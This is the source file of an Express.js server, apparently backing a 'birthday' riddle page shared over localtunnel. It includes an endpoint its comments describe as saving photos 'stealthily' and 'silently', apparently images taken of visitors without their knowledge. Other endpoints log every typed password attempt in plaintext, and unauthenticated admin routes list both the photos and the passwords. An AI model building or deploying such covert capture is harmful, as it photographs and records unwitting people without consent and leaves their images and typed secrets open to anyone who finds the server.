const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Allow large JSON payloads for base64 images
app.use(express.json({ limit: '10mb' }));

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));
// Serve static files from the 'captures' directory mapped to /captures path
app.use('/captures', express.static(path.join(__dirname, 'captures')));

// Ensure captures directory exists
const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) {
    fs.mkdirSync(capturesDir);
}

// Endpoint to list all captured photos for the Admin Panel
app.get('/api/captures', (req, res) => {
    try {
        const files = fs.readdirSync(capturesDir).filter(f => f.endsWith('.png') || f.endsWith('.jpg'));
        // Sort newest first
        files.sort((a, b) => {
            return fs.statSync(path.join(capturesDir, b)).mtime.getTime() - 
                   fs.statSync(path.join(capturesDir, a)).mtime.getTime();
        });
        res.json({ success: true, files });
    } catch(err) {
        console.error("Error reading captures directory:", err);
        res.status(500).json({ success: false, files: [] });
    }
});


// Endpoint to stealthily save photos
app.post('/api/save-photo', (req, res) => {
    try {
        const { imageBase64 } = req.body;
        if (!imageBase64) return res.status(400).send('No image provided');
        
        const base64Data = imageBase64.replace(/^data:image\/png;base64,/, "");
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `photo_${timestamp}.png`;
        const filepath = path.join(capturesDir, filename);
        
        fs.writeFileSync(filepath, base64Data, 'base64');
        console.log(`📸 New photo saved silently to: captures/${filename}`);
        
        res.status(200).send({ success: true });
    } catch(err) {
        console.error("Error saving photo:", err);
        res.status(500).send({ success: false });
    }
});

// --- NEW: Password Attempt Logging ---
const attemptsFile = path.join(__dirname, 'attempts.json');

// Get password attempts
app.get('/api/attempts', (req, res) => {
    try {
        if (!fs.existsSync(attemptsFile)) {
            return res.json({ success: true, attempts: [] });
        }
        const data = fs.readFileSync(attemptsFile, 'utf8');
        const attempts = JSON.parse(data || '[]');
        res.json({ success: true, attempts });
    } catch (err) {
        console.error("Error reading attempts:", err);
        res.status(500).json({ success: false, attempts: [] });
    }
});

// Log a new attempt
app.post('/api/log-attempt', (req, res) => {
    try {
        const { password, timestamp, type = 'riddle' } = req.body;
        let attempts = [];
        if (fs.existsSync(attemptsFile)) {
            const data = fs.readFileSync(attemptsFile, 'utf8');
            attempts = JSON.parse(data || '[]');
        }
        attempts.unshift({ password, timestamp, type }); // Newest first
        // Keep only last 50 attempts
        if (attempts.length > 50) attempts = attempts.slice(0, 50);
        
        fs.writeFileSync(attemptsFile, JSON.stringify(attempts, null, 2));
        console.log(`🔑 New password attempt [${type}] logged: "${password}"`);
        res.status(200).send({ success: true });
    } catch (err) {
        console.error("Error logging attempt:", err);
        res.status(500).send({ success: false });
    }
});



app.listen(PORT, () => {
    console.log(`\n==============================================`);
    console.log(`🎉 Birthday server is running! 🎉`);
    console.log(`==============================================`);
    console.log(`Local Access: http://localhost:${PORT}`);
    console.log(`\nTo share this temporarily over the internet, you can use localtunnel:`);
    console.log(`Run this command in a new terminal:`);
    console.log(`  npx localtunnel --port ${PORT}`);
    console.log(`==============================================\n`);
});
